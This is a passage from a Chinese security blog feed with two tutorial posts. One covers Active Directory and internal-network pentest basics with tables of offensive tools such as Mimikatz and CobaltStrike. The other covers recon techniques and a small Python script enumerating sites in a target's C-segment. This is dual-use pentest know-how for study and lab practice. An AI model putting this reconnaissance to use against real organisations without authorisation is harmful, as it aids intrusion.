title="4:域控和活动目录区别"></a>4:域控和活动目录区别</h3><p><code>活动目录：</code>将计算机/用户/用户组/打印机/共享文件/等分别分类存放在数据库中，以便查找，管理和使用这些资源。那么拥有这个层次结构的数据库就是活动目录数据库，简称AD库。</p><p><code>域控：</code>安装了AD库就变成了域控(用于存储活动目录的数据库的计算机)。</p><h3 id="5-安全域的划分"><a href="#5-安全域的划分" class="headerlink" title="5:安全域的划分"></a>5:安全域的划分</h3><blockquote><p>划分安全域的目的是将一组安全等级相同的计算机划入同一网段。</p></blockquote><p><img src="https://z3.ax1x.com/2021/03/22/6oWgSO.png" alt></p><p>路由器连接的内网中可以划分三个区域：</p><p>1:<strong>安全级别最高的内网</strong></p><p>2:<strong>安全级别中等的DMZ区域</strong></p><p>3:<strong>安全级别最低的外网</strong></p><p>三个区域负责完成不同的任务，因此需要设置不同的的网络访问策略，当有DMZ区域时我们应定义如下的访问控制策略，以实现屏障保护的功能：</p><ul><li>内网可以访问外网：满足内网用户上网查阅资料办公的需求；</li><li>内网可以访问DMZ：是管理者可以管理DMZ区域当中的服务器设备；</li><li>外网不能访问内网：内网存储公司重要资料，可以使用VPN来访问；</li><li>外网可以访问DMZ：DMZ区域中的服务器对外界提供服务，需要由防火墙来完成对外地址到服务器实际地址的转换；</li><li>DMZ不能访问内网：当服务器沦陷保护内网主机不受入侵；</li><li>DMZ不能访问外网：限制入侵黑客的通信隧道，邮件服务器除外；</li></ul><p><strong>补充</strong></p><ol><li><p>内网分为<code>办公区</code>和<code>核心区</code></p></li><li><p>进入内网的攻击手法：<code>鱼叉攻击；水坑攻击；社会工程学</code></p></li></ol><h3 id="6-域内计算机分类"><a href="#6-域内计算机分类" class="headerlink" title="6:域内计算机分类"></a>6:域内计算机分类</h3><blockquote><p>工作组环境内计算机之间身份是平等的没有服务器和客户机之分，而在域环境下的网络中，则有<code>域控制器；成员服务器；客户机；独立服务器</code>之分。</p></blockquote><ul><li>域控制器：用于管理所有的网络访问，包括登录服务器，访问共享目录及资源</li><li>成员服务器：安全了服务器系统并加入了域，主要任务是提供服务</li><li>客户机：安装了个人系统的计算机并加入了域</li><li>独立服务器：能够对外提供服务但是没有加入域</li></ul><h3 id="7-域内权限"><a href="#7-域内权限" class="headerlink" title="7:域内权限"></a>7:域内权限</h3><blockquote><p>组是用户账号的集合，通过组可以更好的管理用的权限；域环境下有<code>本地组；全局组；通用组</code>。</p></blockquote><table><thead><tr><th>组类型</th><th>主要作用</th><th>嵌套关系</th></tr></thead><tbody><tr><td>本地组</td><td>授予本地域内资源的访问权限</td><td>本地组不能嵌套在其他组中</td></tr><tr><td>全局组</td><td>实现单域用户访问多域资源</td><td>全局组可以嵌套在其他组中</td></tr><tr><td>通用组</td><td>实现域森林的跨域访问资源</td><td>通用组成员可以来自域森林中的任何域的用户/全局组和其他通用组</td></tr></tbody></table><p><strong>知识点：</strong>域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林；</p><h4 id="7-1A-G-DL-P策略"><a href="#7-1A-G-DL-P策略" class="headerlink" title="7.1A-G-DL-P策略"></a>7.1A-G-DL-P策略</h4><blockquote><p>A-G-DL-P策略是指将用户账号添加到全局组中，将全局组添加到与本地组中，然后为域本地组分配资源权限；</p></blockquote><ul><li>A：用户账号（Account）</li><li>G：全局组（Global Group）</li><li>U：通用组（Univresal Group）</li><li>DL：域本地组（Domain Local Group）</li><li>p：资源权限（permssion）</li></ul><p>安装域控时，系统会自动生成一些组，为内置组；内置组定义了一些常用的权限–&gt;Builtin和Users组织单元的组就是内置组；</p><ul><li>内置的域本地组在<code>Builtin</code>组织单元中</li><li>内置的全局组和通用组在<code>Users</code>组织单元中</li></ul><table><thead><tr><th>域本地组</th><th>权限</th></tr></thead><tbody><tr><td>administrators</td><td>管理员组，成员可以不受限制的的存取计算机和域内的资源</td></tr><tr><td>Remote Desktop Users</td><td>远程登录组，成员具有远程登录权限</td></tr><tr><td>Account Operators</td><td>账号操作员组，创建和管理域内用户和组，不能更改administrators和Domain Admins组账户</td></tr><tr><td>Domain Admins</td><td>域管理员组，成员在所有加入域的服务器/域控和AD中均默认拥有完整的管理员权限，用户称为域系统管理员可加入</td></tr><tr><td>Domain Users</td><td>域用户组，默认是内置域的User组的成员</td></tr></tbody></table><h1 id="二-内网环境搭建"><a href="#二-内网环境搭建" class="headerlink" title="二:内网环境搭建"></a>二:内网环境搭建</h1><blockquote><p>通常所说的内网渗透测试很大程度上就是域渗透测试</p></blockquote><h4 id="1-网络拓扑"><a href="#1-网络拓扑" class="headerlink" title="1:网络拓扑"></a>1:网络拓扑</h4><table><thead><tr><th>操作系统</th><th>安装服务</th><th>计算机名</th><th>IP地址</th><th>DNS服务器地址</th></tr></thead><tbody><tr><td>Windows server 2012 R2</td><td>AD/DC</td><td>DC</td><td>192.168.1.1</td><td>192.168.1.1</td></tr><tr><td>Windows server 2008 R2</td><td>加入域</td><td>WEB</td><td>192.168.1.2</td><td>192.168.1.1</td></tr><tr><td>Windows 7</td><td>加入域</td><td>WIN7</td><td>192.168.1.3</td><td>192.168.1.1</td></tr></tbody></table><h4 id="2-搭建步骤"><a href="#2-搭建步骤" class="headerlink" title="2:搭建步骤"></a>2:搭建步骤</h4><p><strong>Windows server 2012R2操作流程</strong></p><p>更改IP地址–&gt;更改计算机名–&gt;安装域控和DNS服务–&gt;升级服务器–&gt;创建AD域–&gt;创建用户</p><p><strong>windows server 2008R2操作流程</strong></p><p>更改IP地址与DNS服务器地址–&gt;更改计算机名–&gt;加入域</p><p><strong>windows7操作流程</strong></p><p>更改IP地址与DNS服务器地址–&gt;更改计算机名–&gt;加入域</p><p><strong>&gt;&gt;&gt;</strong>详细操作请看:<a href>域环境搭建</a><strong>&lt;&lt;&lt;</strong></p><h1 id="三-其他环境搭建"><a href="#三-其他环境搭建" class="headerlink" title="三:其他环境搭建"></a>三:其他环境搭建</h1><blockquote><p>搭建具有漏洞的环境，更好的模拟内网入侵的过程</p></blockquote><table><thead><tr><th>漏洞靶场</th><th>环境描述</th></tr></thead><tbody><tr><td>Metasploit2</td><td>一个Ubuntu Linux的虚拟机，内置了常见的漏洞其默认的用户名和密码都是msfadmin；</td></tr><tr><td>Metasploit3</td><td>Metasploit3的升级版，默认密码还是msfadmin</td></tr><tr><td>OWASPBWA</td><td>一款基于虚拟机的渗透测试工具，提供一个存在大量漏洞的网站应用程序环境</td></tr><tr><td>DVWA</td><td>显而易见这是个WEB漏洞靶场….</td></tr></tbody></table><p>内网渗透靶场推荐：</p><ul><li><a href="http://vulnstack.qiyuanxuetang.net/vuln/" target="_blank" rel="noopener">红日靶场</a></li><li><a href="https://www.anquanke.com/post/id/187908" target="_blank" rel="noopener">CFS三层靶机</a></li><li><a href="http://www.yongyindai.com/plus/view.php?aid=62" target="_blank" rel="noopener">Social Network</a></li><li>…</li></ul><h1 id="四-内网渗透工具"><a href="#四-内网渗透工具" class="headerlink" title="四:内网渗透工具"></a>四:内网渗透工具</h1><blockquote><p><strong>掌握渗透测试的方法和思路</strong></p></blockquote><h3 id="1-windows平台常用工具"><a href="#1-windows平台常用工具" class="headerlink" title="1:windows平台常用工具"></a>1:windows平台常用工具</h3><table><thead><tr><th>工具名称</th><th>介绍描述</th></tr></thead><tbody><tr><td>Nmap</td><td>免费的网络发现和安全审计工具，用于发现主机，端口扫描，识别服务，识别操作系统等</td></tr><tr><td>Wireshark</td><td>免费开源的网络协议和数据包分析器，将网络接口设置为混杂模式能够监控整个网络的流量</td></tr><tr><td>PUTTY</td><td>免费开源的SSH和Telnet客户端，主要用于远程访问</td></tr><tr><td>Sqlmap</td><td>免费开源，主要用来对WEB应用程序进行SQL注入攻击测试，只是不同数据库</td></tr><tr><td>Burpsuite</td><td>(音译：boposwt)主要用于对WEB应用程序进行安全测试的集成平台</td></tr><tr><td>Hydra</td><td>网络登录的破解工具，支持多种协议</td></tr><tr><td>Getif</td><td>基于windows的免费图形界面工具，用于收集SNMP设备的信息</td></tr><tr><td>Cain&amp;Able</td><td>强有力的嗅探工具与密码破解</td></tr><tr><td>PowerSploit</td><td>基于PowerShell的后渗透框架,包含很多PowerShell攻击脚本,主要用于信息侦查,权限提升,权限维持</td></tr><tr><td>Nishang</td><td>Powershell脚本和有效载荷的框架的集合</td></tr></tbody></table><h3 id="2-Kali-Linux平台常用工具"><a href="#2-Kali-Linux平台常用工具" class="headerlink" title="2:Kali Linux平台常用工具"></a>2:Kali Linux平台常用工具</h3><table><thead><tr><th>工具名称</th><th>介绍描述</th></tr></thead><tbody><tr><td>WCE</td><td>Windows凭据管理器，列出登录会话，添加/修改/列出/删除关联凭据（LM HASH/NTML HASH/明文密码/Kerberos票据）</td></tr><tr><td>Mimikatz</td><td>用于从内存中获取明文密码，现金票据和秘钥等</td></tr><tr><td>Responder</td><td>嗅探网络内所有LLMNR包和获取各主机的信息</td></tr><tr><td>Beff</td><td>一款针对浏览器的渗透测试工具</td></tr><tr><td>DSHashes</td><td>从NTDSXtract中提取用于易于理解的散列值</td></tr><tr><td>Powersploit</td><td>基于PowerShell的后渗透框架,包含很多PowerShell攻击脚本,主要用于信息侦查,权限提升,权限维持</td></tr><tr><td>Nishang</td><td>针对Powershell的渗透测试工具，集成了框架，脚本和各种payload</td></tr><tr><td>Empire</td><td>内网渗透利器，跨平台，有丰富的模块和接口，用于可自行添加模块和功能</td></tr><tr><td>ps_encoder.py</td><td>使用base64编码封装的powershell命令包，目的是混淆和压缩代码</td></tr><tr><td>smbexec</td><td>使用Samba工具的快速psexec类工具</td></tr><tr><td>Veil</td><td>生成绕过常见的防病毒解决方案的Metasploit有效载荷</td></tr><tr><td>Metasploit</td><td>漏洞攻击平台/5大框架：exploit/auxiliary/payload/post/encoder</td></tr><tr><td>CobaltStrike</td><td>优秀的后渗透测试平台，主要用于内网渗透适合团队间协同工作</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;一-内网渗透基础&quot;&gt;&lt;a href=&quot;#一-内网渗透基础&quot; class=&quot;headerlink&quot; title=&quot;一:内网渗透基础&quot;&gt;&lt;/a&gt;一:内网渗透基础&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;内网也是指计
      
    
    </summary>
    
      <category term="信息收集、内网" scheme="https://xyzsec.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%81%E5%86%85%E7%BD%91/"/>
    
    
      <category term="信息收集、内网、基础知识、环境搭建" scheme="https://xyzsec.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%81%E5%86%85%E7%BD%91%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="https://xyzsec.cn/2021/08/10/zi-chan-xin-xi-shou-ji-1/"/>
    <id>https://xyzsec.cn/2021/08/10/zi-chan-xin-xi-shou-ji-1/</id>
    <published>2021-08-10T07:27:31.000Z</published>
    <updated>2021-10-17T09:36:16.000Z</updated>
    
    <content type="html"><![CDATA[<p><a name="3hIcr">资产信息收集</a></p><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p><img src="1.png" alt></p><h1 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h1><p><img src="2.png" alt></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><img src="3.png" alt></p><h2 id="什么是资产"><a href="#什么是资产" class="headerlink" title="什么是资产"></a>什么是资产</h2><p><img src="4.png" alt></p><h2 id="重要性"><a href="#重要性" class="headerlink" title="重要性"></a>重要性</h2><p><img src="5.png" alt></p><h1 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h1><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p>通过查询备案信息，可以获取该企业的一些基本信息：网站地址，网站域名等</p><h2 id="工信部网站备案查询"><a href="#工信部网站备案查询" class="headerlink" title="工信部网站备案查询"></a>工信部网站备案查询</h2><p><a href="https://beian.miit.gov.cn/#/Integrated/index" target="_blank" rel="noopener">https://beian.miit.gov.cn/#/Integrated/index</a> </p><p><img src="6.png" alt></p><p><img src="7.png" alt></p><h2 id="天眼查网站备案查询"><a href="#天眼查网站备案查询" class="headerlink" title="天眼查网站备案查询"></a>天眼查网站备案查询</h2><p>网站：<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></p><h2 id="国家企业信用信息公示系统"><a href="#国家企业信用信息公示系统" class="headerlink" title="国家企业信用信息公示系统"></a>国家企业信用信息公示系统</h2><p>网站：<a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a>  </p><p><img src="8.png" alt></p><h2 id="域名助手备案信息查询"><a href="#域名助手备案信息查询" class="headerlink" title="域名助手备案信息查询"></a>域名助手备案信息查询</h2><p>地址：<a href="http://cha.fute.com/index" target="_blank" rel="noopener">http://cha.fute.com/index</a></p><p><img src="9.png" alt></p><h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><p>国外的who.is：<a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a> <br>站长之家：<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br>爱站：<a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a> <br>微步：<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> <br>腾讯云：<a href="https://whois.cloud.tencent.com/" target="_blank" rel="noopener">https://whois.cloud.tencent.com/</a><br>美橙互联：<a href="https://whois.cndns.com/" target="_blank" rel="noopener">https://whois.cndns.com/</a><br>爱名网：<a href="https://www.22.cn/domain/" target="_blank" rel="noopener">https://www.22.cn/domain/</a><br>易名网：<a href="https://whois.ename.net/" target="_blank" rel="noopener">https://whois.ename.net/</a><br>中国万网：<a href="https://whois.aliyun.com/" target="_blank" rel="noopener">https://whois.aliyun.com/</a><br>西部数码：<a href="https://whois.west.cn/" target="_blank" rel="noopener">https://whois.west.cn/</a><br>新网域名：<a href="http://whois.xinnet.com/domain/whois/index.jsp" target="_blank" rel="noopener">http://whois.xinnet.com/domain/whois/index.jsp</a><br>纳网域名：<a href="http://whois.nawang.cn/" target="_blank" rel="noopener">http://whois.nawang.cn/</a><br>中资源域名：<a href="https://www.zzy.cn/domain/whois.html" target="_blank" rel="noopener">https://www.zzy.cn/domain/whois.html</a><br>三五互联域名：<a href="https://cp.35.com/chinese/whois.php" target="_blank" rel="noopener">https://cp.35.com/chinese/whois.php</a><br>新网互联域名：<a href="http://www.dns.com.cn/show/domain/whois/index.do" target="_blank" rel="noopener">http://www.dns.com.cn/show/domain/whois/index.do</a><br><br><br>通过whois查询我们可以查询到注册商，注册人，邮件，DNS解析服务器，注册人电话等信息</p><p><img src="10.png" alt></p><p>同时也可以进行whois反查，查找更多相关信息</p><h1 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p><img src="11-1634447487649.png" alt></p><h2 id="工具枚举-amp-爬虫"><a href="#工具枚举-amp-爬虫" class="headerlink" title="工具枚举&amp;爬虫"></a>工具枚举&amp;爬虫</h2><p><img src="12-1634447535125.png" alt></p><h2 id="layer子域名挖掘机"><a href="#layer子域名挖掘机" class="headerlink" title="layer子域名挖掘机"></a>layer子域名挖掘机</h2><p>下载地址：<a href="https://github.com/euphrat1ca/LayerDomainFinder" target="_blank" rel="noopener">https://github.com/euphrat1ca/LayerDomainFinder</a><br><a name="40LsW"></a></p><h2 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h2><p>下载地址：<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a><br></p><p><img src="13.png" alt></p><h2 id="subDomainBrute"><a href="#subDomainBrute" class="headerlink" title="subDomainBrute"></a>subDomainBrute</h2><p>下载地址：<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a><br></p><p><img src="14.png" alt></p><p><img src="15.png" alt></p><h1 id="网站查询-amp-搜索引擎查询"><a href="#网站查询-amp-搜索引擎查询" class="headerlink" title="网站查询&amp;搜索引擎查询"></a>网站查询&amp;搜索引擎查询</h1><p><a name="lvOWW"></a></p><h2 id="网站查询"><a href="#网站查询" class="headerlink" title="网站查询"></a>网站查询</h2><p>DNSDB：<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br>在线子域名查询：<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a><br>ip或域名查询：<a href="https://site.ip138.com/" target="_blank" rel="noopener">https://site.ip138.com/</a><br>子域名扫描：<a href="https://www.t1h2ua.cn/tools/" target="_blank" rel="noopener">https://www.t1h2ua.cn/tools/</a><br>Aleax网站：<a href="https://alexa.chinaz.com/" target="_blank" rel="noopener">https://alexa.chinaz.com/</a><br>securitytrails：<a href="https://securitytrails.com/list/apex_domain/www.baidu.com" target="_blank" rel="noopener">https://securitytrails.com/list/apex_domain/www.baidu.com</a><br>dns侦测：<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a><br><a name="hEFc6"></a></p><h2 id="搜索引擎查询"><a href="#搜索引擎查询" class="headerlink" title="搜索引擎查询"></a>搜索引擎查询</h2><p>原理：通过搜索引擎获取已经爬取的子域名<br>语法：site:360.cn<br>使用”-“减号来去除已知子域名：site:target.com-www-blog<br>相关工具：theHarvester<br><a name="yB62f"></a></p><h3 id="theHarvester"><a href="#theHarvester" class="headerlink" title="theHarvester"></a>theHarvester</h3><p><img src="16.png" alt></p><p>空间引擎<br><br><img src="17.png" alt></p><h2 id="HTTPS证书透明度"><a href="#HTTPS证书透明度" class="headerlink" title="HTTPS证书透明度"></a>HTTPS证书透明度</h2><p>谷歌Chrome要求2017年所有SSL证书都要支持证书透明，所以可以根据CT log查询支持HTTPS网站的子域名<br>crtsh：<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a><br><br><br>facebook：<a href="https://developers.facebook.com/tools/ct" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct</a><br><br><br>entrust：<a href="https://www.entrust.com/ct-search/" target="_blank" rel="noopener">https://www.entrust.com/ct-search/</a><br><br><br>certspotter：<a href="https://sslmate.com/certspotter/api/" target="_blank" rel="noopener">https://sslmate.com/certspotter/api/</a><br><br><br>spyse：<a href="https://spyse.com/search/certificate" target="_blank" rel="noopener">https://spyse.com/search/certificate</a><br><br><br>censys：<a href="https://censys.io/certificates" target="_blank" rel="noopener">https://censys.io/certificates</a><br><br><br>google： <a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a><br></p><p><a name="dwwJ1"></a></p><h2 id="用DNS数据搜索子域"><a href="#用DNS数据搜索子域" class="headerlink" title="用DNS数据搜索子域"></a>用DNS数据搜索子域</h2><p>原理：利用DNS记录公开数据收集<br>住：将需要（domain）换成需要查询的域名，标红的效果较好<br>ip138：<a href="https://site.ip138.com/%7Bdomain%7D/domain.htm" target="_blank" rel="noopener">https://site.ip138.com/{domain}/domain.htm</a><br>百度云观测：<a href="http://ce.baidu.com/index/getRelatedSites?site_address=%7Bdomain%7D" target="_blank" rel="noopener">http://ce.baidu.com/index/getRelatedSites?site_address={domain}</a><br>hackertarget：<a href="https://hackertarget.com/find-dns-host-records/" target="_blank" rel="noopener">https://hackertarget.com/find-dns-host-records/</a><br>riddler：<a href="https://riddler.io/search?q=pld:%7Bdomain%7D" target="_blank" rel="noopener">https://riddler.io/search?q=pld:{domain}</a><br>bufferover：<a href="https://dns.bufferover.run/dns?q=%7Bdomain%7D" target="_blank" rel="noopener">https://dns.bufferover.run/dns?q={domain}</a><br>dnsdb：<a href="https://dnsdb.io/zh-cn/search?q=%7Bdomain%7D" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/search?q={domain}</a><br>ipv4info：<a href="http://ipv4info.com/" target="_blank" rel="noopener">http://ipv4info.com/</a><br>robtex：<a href="https://www.robtex.com/dns-lookup/" target="_blank" rel="noopener">https://www.robtex.com/dns-lookup/</a><br>chinaz：<a href="https://alexa.chinaz.com/" target="_blank" rel="noopener">https://alexa.chinaz.com/</a><br>netcraft：<a href="https://searchdns.netcraft.com/" target="_blank" rel="noopener">https://searchdns.netcraft.com/</a><br>dnsdumpster：<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a><br>sitedossier：<a href="http://www.sitedossier.com/" target="_blank" rel="noopener">http://www.sitedossier.com/</a><br>findsubdomains：<a href="https://findsubdomains.com/" target="_blank" rel="noopener">https://findsubdomains.com/</a><br><a name="FVgwK"></a></p><h2 id="利用威胁情报平台数据收集子域"><a href="#利用威胁情报平台数据收集子域" class="headerlink" title="利用威胁情报平台数据收集子域"></a>利用威胁情报平台数据收集子域</h2><p>注：需注册，注册后免费查询<br>AlienVault：<a href="https://otx.alienvault.com/" target="_blank" rel="noopener">https://otx.alienvault.com/</a><br><br><br>RiskIQ 社区版：<a href="https://community.riskiq.com/" target="_blank" rel="noopener">https://community.riskiq.com/</a><br><br><br>微步在线：<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br><br><br>ThreatMiner.org：<a href="https://www.threatminer.org/domain.php?q=%7Bdomain%7D" target="_blank" rel="noopener">https://www.threatminer.org/domain.php?q={domain}</a><br><br><br>VT：<a href="https://www.virustotal.com/gui/domain/%7Bdomain%7D/relations" target="_blank" rel="noopener">https://www.virustotal.com/gui/domain/{domain}/relations</a><br><br><br>Pentest-Tools.com：<a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain#" target="_blank" rel="noopener">https://pentest-tools.com/information-gathering/find-subdomains-of-domain#</a><br></p><p><a name="wJIzc"></a></p><h2 id="隐藏域名hosts碰撞"><a href="#隐藏域名hosts碰撞" class="headerlink" title="隐藏域名hosts碰撞"></a>隐藏域名hosts碰撞</h2><p><br>隐藏资产探则- hosts碰撞<br>很多时候访问目标资产IP响应多为: 401、 403、 404、 500, 但是用域名请求却能返回正常的业务系统(禁止IP直接访问)，因为这大多数都是需要绑定host才能正常请求访问的(目前互联网公司基本的做法) (域名删除 了A记录，但是反代的配置未更新)，那么我们就可以通过收集到的目标的域名和目标资产的IP段组合起来，以IP段+域名的形式进行捆绑碰撞，就能发现很多有意思的东西;<br><br><br>脚本工具<br>地址：<a href="https://github.com/fofapro/Hosts_scan" target="_blank" rel="noopener">https://github.com/fofapro/Hosts_scan</a> <br>原理：在发生http请求的时候，对域名和IP列表进行配，然后遍历发送请求（就相当于修改了本地的hosts文件一样），并把相应的title和响应包大小拿回来做对比，即可快速发现一些隐蔽的资产<br>使用：进行hosts碰撞需要目标的域名和目标的相关IP作为字典；<br>相关IP来源有：<br>a：目标域名历史解析IP<br><a href="https://site.ip138.com/" target="_blank" rel="noopener">https://site.ip138.com/</a><br><a href="https://ipchaxun.com/" target="_blank" rel="noopener">https://ipchaxun.com/</a><br>b：页面js源码爬取IP<br>oneforall貌似实现了长亭的rad以burp为代理爬，保存返回包，在正则提取Ip<br>参考：<a href="https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q</a><br><a name="QLlzb"></a></p><p>##<br><a name="LHDuD"></a></p><h1 id="旁注-C段"><a href="#旁注-C段" class="headerlink" title="旁注/C段"></a>旁注/C段</h1><p><a name="lEcFV"></a></p><h2 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a>旁注</h2><p><img src="18.png" alt></p><h2 id="IP逆向查询"><a href="#IP逆向查询" class="headerlink" title="IP逆向查询"></a>IP逆向查询</h2><p>yougetsignal：<a href="https://www.yougetsignal.com/tools/web-sites-on-web-server/" target="_blank" rel="noopener">https://www.yougetsignal.com/tools/web-sites-on-web-server/</a><br>站长工具：<a href="http://s.tool.chinaz.com/same/" target="_blank" rel="noopener">http://s.tool.chinaz.com/same/</a><br>爱站：<a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a><br>同ip网站查询：<a href="http://dns.bugscaner.com/" target="_blank" rel="noopener">http://dns.bugscaner.com/</a><br>webscan：<a href="https://www.webscan.cc/" target="_blank" rel="noopener">https://www.webscan.cc/</a><br><a name="Mw419"></a></p><h2 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h2><p><img src="19.png" alt></p><h2 id="查询C段方法："><a href="#查询C段方法：" class="headerlink" title="查询C段方法："></a>查询C段方法：</h2><p><img src="20.png" alt></p><h2 id="旁注查询小脚本："><a href="#旁注查询小脚本：" class="headerlink" title="旁注查询小脚本："></a>旁注查询小脚本：</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">get_c</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在收集{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    url<span class="token operator">=</span><span class="token string">"http://api.webscan.cc/?action=query&amp;ip={}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>    html<span class="token operator">=</span>req<span class="token punctuation">.</span>text    data<span class="token operator">=</span>req<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'null'</span> <span class="token operator">not</span> <span class="token keyword">in</span> html<span class="token punctuation">:</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"resulit.txt"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ip <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"resulit.txt"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\t{} {}\n"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'domain'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     [+] {} {}[+]"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'domain'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_ips</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>    iplist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    ips_str <span class="token operator">=</span> ip<span class="token punctuation">[</span><span class="token punctuation">:</span>ip<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> ips <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ipadd<span class="token operator">=</span>ips_str <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>ips<span class="token punctuation">)</span>        iplist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ipadd<span class="token punctuation">)</span>    <span class="token keyword">return</span> iplistip<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"请你输入要查询的ip:"</span><span class="token punctuation">)</span>ips<span class="token operator">=</span>get_ips<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token keyword">for</span> p <span class="token keyword">in</span> ips<span class="token punctuation">:</span>    get_c<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a 